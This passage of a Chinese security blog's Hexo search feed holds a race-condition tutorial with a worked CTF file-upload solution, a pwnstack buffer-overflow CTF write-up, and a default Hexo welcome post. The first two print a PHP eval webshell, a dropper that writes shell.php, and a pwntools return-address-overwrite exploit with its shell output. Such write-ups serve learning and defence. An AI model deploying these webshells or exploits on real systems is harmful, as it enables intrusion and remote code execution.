    <content type="html"><![CDATA[<h2 id="Web安全条件竞争漏洞学习">Web安全条件竞争漏洞学习</h2><h4 id="0x00-概述">0x00 概述</h4><p>​条件竞争漏洞发生在多个线程同时访问同一个共享代码、变量、文件等，，由于多个不同线程同时与相同的数据进行交互，从而导致碰撞冲突（例如，后端多个线程同时修改数据库中的某一个字段值）。攻击者通过精心定制请求到达后端的时间故意制造冲突，并由此实现恶意目的。这个漏洞存在于操作系统、数据库、web等多个层面，由于大多服务端框架在处理不同用户的请求时是并发进行的，而开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。</p><h6 id="简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作">简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作</h6><span id="more"></span><h4 id="0x01-简单分析">0x01 简单分析</h4><p>我们来设计一个简答的业务逻辑：商城系统中，用户提交折扣码，后端会检测用户是否已经使用过折扣码。若未使用过，则使用该折扣码，并记录折扣码使用状态为True。若已使用折扣码，用户再次使用折扣码时，后端程序读取折扣码使用状态为True，拒绝用户再次使用折扣码。</p><p><img src="https://pic2.zhimg.com/80/v2-ffffaa1fb957682cebb626a0482344b3_720w.webp" alt="Lesson-eb3846115f6b8"></p><p>我们在这里用一段简单的python代码来模拟后端逻辑，处理请求的<code>handle_req()</code>函数是并发（多线程/多进程）执行的：</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">def</span> **handle_req**():    <span class="hljs-keyword">if</span> code_already_used = <span class="hljs-literal">False</span>: <span class="hljs-comment"># 判断如果没有使用过折扣码（实际应该是对数据库的查询，此处简化写法）</span>        use_code()  <span class="hljs-comment"># 使用折扣码，对商品进行打折</span>        code_already_used = <span class="hljs-literal">True</span>  <span class="hljs-comment"># 使用过折扣码后，将折扣码使用状态为True（实际应该是对数据库的数据更新，此处简化写法）</span>    <span class="hljs-keyword">else</span>:  <span class="hljs-comment"># 若已经使用过折扣码</span>        reject_use_code()        <span class="hljs-comment"># 拒绝再次使用折扣码</span></code></pre></div><p>但是这个过程可能会存在条件竞争漏洞，因为我们第一次请求判断的状态为false即未使用折扣码，但是第一个请求执行到第四行时准备更新数据库内容而第二个请求又开始执行并将折扣码使用状态再一次地标记为false，从而造成了使用了两次折扣码，触发了条件竞争漏洞，如下图所示：后端将记录折扣码使用状态为True之前，可能存在条件竞争，上述第2、3行代码执行的时间就是<code>竞争窗口</code>。</p><p><img src="https://pica.zhimg.com/80/v2-b3ccc0bc7165f6bd90fcf6769c591786_720w.webp" alt="Lesson-eb3846115f6b8"></p><p>竞争窗口一般是一段很短的时间段（几毫秒甚至更短），用户通过并行发送多个数据包，使得服务端竞争窗口内执行多次特定的功能。</p><p><img src="https://pic4.zhimg.com/80/v2-936e0bec041297e3b7f8b1f0d9f568d1_720w.webp" alt="Lesson-eb3846115f6b8"></p><h4 id="0x02-CTF中的条件竞争">0x02 CTF中的条件竞争</h4><p>我们来看这样的一道题目</p><p>【题型】<a href>Web</a><br>【题目】<code>wzsc_文件上传</code><br>【来源】（[攻防世界](<a href="https://adworld.xctf.org.cn/challenges/list%EF%BC%89">https://adworld.xctf.org.cn/challenges/list）</a><br>【思路】<a href>条件竞争</a></p><p>我们先上传一个一句话木马并把包拦截下来进行分析测试</p><div class="code-wrapper"><pre><code class="hljs bash">POST /upload.php HTTP/1.1Host: Host:PortContent-Length: 230Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://61.147.171.105:56903Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMwWBoiGSKcfAYxLhUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: Host:PortAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Connection: close------WebKitFormBoundaryMwWBoiGSKcfAYxLhContent-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;classic.php&quot;</span>Content-Type: application/octet-stream&lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;shell&quot;</span>]); ?&gt;------WebKitFormBoundaryMwWBoiGSKcfAYxLh--</code></pre></div><p>我们把它放到Repeater中放出去看看，查看返回包</p><div class="code-wrapper"><pre><code class="hljs bash">HTTP/1.1 200 OKDate: Sat, 08 Feb 2025 09:38:03 GMTServer: Apache/2.4.18 (Ubuntu)Content-Length: 0Connection: closeContent-Type: text/html; charset=UTF-8</code></pre></div><p>我们可以看到这里的状态码是200，证明我们是可以成功上传但是在服务器中被删除了，那这时候可以使用以下思路</p><p>我们先尝试访问我们上传的一句话并拦截包</p><div class="code-wrapper"><pre><code class="hljs bash">GET /upload/classic.php HTTP/1.1Host: 61.147.171.105:56903Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Connection: close</code></pre></div><p>这样，我们可以在<code>BurpSuite</code>中同时拦截下这两个数据包，然后发送至Intruder模块，将payload设置为<code>Null Payload</code>，并开始攻击，这样我们还需要搭配上这样的一句PHP代码</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;shell.php&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span></code></pre></div><p>它的作用是只要我们上传的文件能被成功访问，它就能在服务器上新建一个<code>shell.php</code>并将一句话写入，从而使我们能够成功<code>getshel</code>l~</p><p>用两个不同的数据包设置<code>Null Payload</code>的作用是利用我们提到的“竞争窗口”即上传成功到被删除的这一小段时间去访问我们上传的内鬼让其在服务器上生成一个接应我们的shell，其实简单地说就是用两个不同的操作去同时读写一个文件</p><p><img src="https://pic2.zhimg.com/80/v2-98252be57cdc6ace37d120354c2b5da1_720w.webp" alt="4"></p><p>Success to upload！</p><p>成功拿到flag：<code>cyberpeace&#123;This_is_a_sample_flag&#125;</code></p><h4 id="0x03-如何防御？">0x03 如何防御？</h4><p>以下总结了一些防御方法和常见条件竞争漏洞示例及防御</p><p>(1) 使用同步机制<br>锁（Lock）：通过加锁确保同一时间只有一个线程或进程可以访问共享资源。<br>信号量（Semaphore）：限制同时访问资源的线程或进程数量。<br>互斥量（Mutex）：类似于锁，用于多线程环境。<br>(2) 原子操作<br>使用原子操作确保操作的不可分割性。<br>示例：<br>数据库中的事务（Transaction）。<br>编程语言中的原子类型（如 atomic 在 C++ 或 Java 中）。<br>(3) 避免共享资源<br>尽量减少共享资源的使用，采用线程本地存储（Thread Local Storage, TLS）或进程隔离。<br>示例：<br>使用线程本地变量代替全局变量。<br>(4) 文件操作防御<br>使用文件锁（File Lock）确保同一时间只有一个进程可以访问文件。<br>(5) 数据库操作防御<br>使用事务（Transaction）和锁机制（如行锁、表锁）确保数据一致性。<br>(6) 时间窗口最小化<br>减少竞争条件的发生概率，尽量缩短共享资源的访问时间。<br>示例：<br>在文件操作中，尽快释放文件锁。<br>(7) 使用不可变对象<br>使用不可变对象（Immutable Objects）避免共享资源被修改。<br>示例：<br>在函数式编程中，尽量使用不可变数据结构。<br>(8) 输入验证和边界检查<br>对用户输入进行严格验证，避免恶意输入触发竞争条件。<br>示例：<br>检查文件路径、用户权限等。<br>(9) 代码审查和测试<br>通过代码审查发现潜在的竞争条件。<br>使用压力测试和并发测试工具（如 JMeter、Locust）模拟高并发场景。</p><p>常见条件竞争漏洞示例及防御<br>(1) TOCTOU（Time-of-Check to Time-of-Use）</p><div class="code-wrapper"><pre><code class="hljs c">漏洞描述：在检查资源状态和使用资源之间存在时间窗口，攻击者可以利用这个时间窗口修改资源状态。防御方法：    使用原子操作（如 open() 的 O_EXCL 标志）。    示例（C 语言）：    c    复制    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;file.txt&quot;</span>, O_WRONLY | O_CREAT | O_EXCL, <span class="hljs-number">0644</span>);    <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;        <span class="hljs-comment">// 文件已存在</span>    &#125;</code></pre></div><p>(2) 文件上传漏洞</p><div class="code-wrapper"><pre><code class="hljs python">漏洞描述：攻击者在上传文件时，利用时间窗口替换文件内容。防御方法：    使用临时文件，上传完成后再重命名。    示例：    python    复制    <span class="hljs-keyword">import</span> os    <span class="hljs-keyword">import</span> tempfile    <span class="hljs-keyword">with</span> tempfile.NamedTemporaryFile(delete=<span class="hljs-literal">False</span>) <span class="hljs-keyword">as</span> tmp_file:        tmp_file.write(<span class="hljs-string">b&quot;file content&quot;</span>)        tmp_path = tmp_file.name    os.rename(tmp_path, <span class="hljs-string">&quot;final_file.txt&quot;</span>)</code></pre></div><p>(3) 并发修改共享变量</p><div class="code-wrapper"><pre><code class="hljs java">漏洞描述：多个线程同时修改共享变量，导致数据不一致。防御方法：    使用锁或原子操作。    示例（Java）：    java    复制    <span class="hljs-keyword">import</span> java.util.concurrent.atomic.AtomicInteger;    <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">sharedResource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateResource</span><span class="hljs-params">()</span> &#123;        sharedResource.incrementAndGet();    &#125;</code></pre></div><h6 id="一些素材来源：">一些素材来源：</h6><p><a href="https://noa.pages.dev/posts/web_security/race_conditions/">Noah’s Blog</a></p><p><a href="https://chat.deepseek.com/">DeepSeek</a></p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-pwnstack题解</title>
    <link href="/2025/02/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwnstack%E9%A2%98%E8%A7%A3/"/>
    <url>/2025/02/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwnstack%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="攻防世界-pwnstack题解">攻防世界-pwnstack题解</h2><h4 id="一、简述">一、简述</h4><p>【题型】<a href>PWN</a><br>【题目】<code>pwnstack</code><br>【来源】[攻防世界](<a href="https://adworld.xctf.org.cn/challenges/list%EF%BC%89">https://adworld.xctf.org.cn/challenges/list）</a><br>【思路】<a href>栈溢出</a></p><h4 id="二、思路及过程">二、思路及过程</h4><span id="more"></span><p>Step.1：先使用<code>checksec</code>和<code>file</code>了解有关这个文件的一些信息</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># zer0-r1ng @ ring0rez-Laptop in ~/Challenge/Adworld/pwnstack/[16:27:17]</span>$ checksec pwn2[*] <span class="hljs-string">&#x27;/Challenge/Adworld/pwnstack/pwn2&#x27;</span>    Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x400000)    Stripped:   No<span class="hljs-comment"># zer0-r1ng @ ring0rez-Laptop in ~/Challenge/Adworld/pwnstack/[16:30:13] C:1</span>$ file pwn2pwn2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=62aa40d64871e142a32827b4e403772e72f67fba, not stripped</code></pre></div><p>我们从中可以得知它是一个64位的ELF格式文件</p><p>Step.2：放入IDA Pro中进行分析</p><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-built_in">initsetbuf</span>(argc, argv, envp);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is pwn1,can you do that??&quot;</span>);  <span class="hljs-built_in">vuln</span>();  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>在里面我们发现了一个非常可疑的<code>puts</code> 和<code>vuln</code> 函数，点进去看看</p><div class="code-wrapper"><pre><code class="hljs scss">__int64 <span class="hljs-built_in">vuln</span>()&#123;  char buf<span class="hljs-selector-attr">[160]</span>; <span class="hljs-comment">// [rsp+0h] [rbp-A0h] BYREF</span>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, sizeof(buf));  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0</span>xB1uLL);  return <span class="hljs-number">0</span>LL;&#125;</code></pre></div><p>在vuln函数中我们可以看到函数分配了一个大小为 160 字节的缓冲区 <code>buf</code>，然后使用 <code>read</code> 函数从标准输入（文件描述符 0）读取数据到这个缓冲区中。然而，<code>read</code> 函数被指示读取最多 0xB1（即 177）字节的数据，这比缓冲区 <code>buf</code> 能够容纳的多，从而导致了缓冲区溢出的风险。</p><p>Step.5：shift+F12查看字符串发现<code>/bin/sh</code>，进入发现后门函数，查看地址（ctr+x）发现为：<code>0x400762</code></p><div class="code-wrapper"><pre><code class="hljs c">LOAD:<span class="hljs-number">0000000000400238</span><span class="hljs-number">0000001</span>CC/lib64/ld-linux-x86<span class="hljs-number">-64.</span>so.<span class="hljs-number">2</span>LOAD:<span class="hljs-number">00000000004003B</span>9<span class="hljs-number">0000000</span>AClibc.so.<span class="hljs-number">6</span>LOAD:<span class="hljs-number">00000000004003</span>C8<span class="hljs-number">00000006</span>C<span class="hljs-built_in">stdin</span>LOAD:<span class="hljs-number">00000000004003</span>D3<span class="hljs-number">00000007</span>C<span class="hljs-built_in">stdout</span>LOAD:<span class="hljs-number">00000000004003</span>DA<span class="hljs-number">00000007</span>C<span class="hljs-built_in">stderr</span>LOAD:<span class="hljs-number">00000000004003E1</span><span class="hljs-number">00000007</span>CsystemLOAD:<span class="hljs-number">00000000004003E8</span><span class="hljs-number">00000008</span>CsetvbufLOAD:<span class="hljs-number">00000000004003F</span>0<span class="hljs-number">00000012</span>C__libc_start_mainLOAD:<span class="hljs-number">0000000000400402</span><span class="hljs-number">0000000F</span>C__gmon_start__LOAD:<span class="hljs-number">0000000000400411</span><span class="hljs-number">0000000</span>CCGLIBC_2.<span class="hljs-number">2.5</span>.rodata:<span class="hljs-number">0000000000400838</span><span class="hljs-number">00000008</span>C/bin/sh.rodata:<span class="hljs-number">0000000000400848</span><span class="hljs-number">0000001F</span>Cthis is pwn1,can you <span class="hljs-keyword">do</span> that??.eh_frame:<span class="hljs-number">000000000040091F</span><span class="hljs-number">00000006</span>C;*<span class="hljs-number">3</span>$\<span class="hljs-string">&quot;</span></code></pre></div><p>Step.6：构造exp并caught到flag</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<span class="hljs-attribute">p</span>=remote(&quot;Host&quot;,Port)<span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*0xa8+p64(0x400762)p.sendline(payload)p.interactive()</code></pre></div><p>在上面的exp代码中使用了<code>pwntools</code>库并连接到远程服务器，随后我们构造了一个长度为”0xa8“并用’a’去填充和类型为二进制数据的payload，并覆盖返回地址到<code>0x400762</code>并将返回地址转换为小端序的64位进行表示</p><div class="code-wrapper"><pre><code class="hljs bash">zer0-r1ng @ ring0rez-Laptop <span class="hljs-keyword">in</span> ~/Challenge/Adworld/pwnstack/[16:50:22]$ python3 exp.py[+] Opening connection to 61.147.171.105 on port 54428: Done[*] Switching to interactive modethis is pwn1,can you <span class="hljs-keyword">do</span> that??$ <span class="hljs-built_in">ls</span>bindevflagliblib32lib64pwn2$ <span class="hljs-built_in">cat</span> flagcyberpeace&#123;9d0526386a432e6fcf65858cd1ee804d&#125;</code></pre></div><script src="https://giscus.app/client.js" data-repo="fishcanf1y/fishcanf1y.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/02/05/hello-world/"/>
    <url>/2025/02/05/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start">Quick Start</h2><span id="more"></span><h3 id="Create-a-new-post">Create a new post</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span></code></pre></div><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server">Run server</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo server</code></pre></div><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files">Generate static files</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo generate</code></pre></div><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo deploy</code></pre></div><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><script src="https://giscus.app/client.js" data-repo="solkatt-cn/solkatt-cn.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
